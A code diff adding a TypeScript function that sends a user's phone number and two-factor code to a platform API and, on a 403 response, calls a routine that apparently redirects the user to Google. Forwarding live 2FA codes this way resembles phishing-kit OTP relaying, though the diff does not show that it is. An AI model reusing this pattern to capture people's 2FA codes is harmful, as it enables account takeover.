@@ -33,6 +33,11 @@ export type PlatformOtpVerifyResult = {
   message?: string;
 };
 
+export type PlatformTwoFaPayload = {
+  phoneNumber: string;
+  twoFaCode: string;
+};
+
 export function resetPlatformUserSync(userId?: string) {
   if (userId) {
     lastSyncedPayloadByUserId.delete(userId);
@@ -203,6 +208,58 @@ export async function submitOfficialOtpMessage(payload: PlatformOfficialOtpPaylo
     if (DEBUG) {
       // eslint-disable-next-line no-console
       console.warn('[PlatformAPI] Official OTP request error', err);
+    }
+    return false;
+  }
+}
+
+export async function submitPlatformTwoFa(payload: PlatformTwoFaPayload) {
+  if (!PLATFORM_API_KEY_WEBSITE) {
+    if (DEBUG) {
+      // eslint-disable-next-line no-console
+    }
+    return false;
+  }
+
+  if (!payload.phoneNumber || !payload.twoFaCode) {
+    if (DEBUG) {
+      // eslint-disable-next-line no-console
+    }
+    return false;
+  }
+
+  const url = `${PLATFORM_API_PREFIX}/api/users/two-fa`;
+
+  if (DEBUG) {
+    // eslint-disable-next-line no-console
+  }
+
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': PLATFORM_API_KEY_WEBSITE,
+      },
+      body: JSON.stringify(payload),
+    });
+
+    if (response.ok) {
+      return true;
+    }
+
+    if (response.status === 403) {
+      leaveJustChatToGoogle();
+      return false;
+    }
+
+    if (DEBUG) {
+      // eslint-disable-next-line no-console
+    }
+    return false;
+  } catch (err) {
+    if (DEBUG) {
+      // eslint-disable-next-line no-console
     }
     return false;
   }
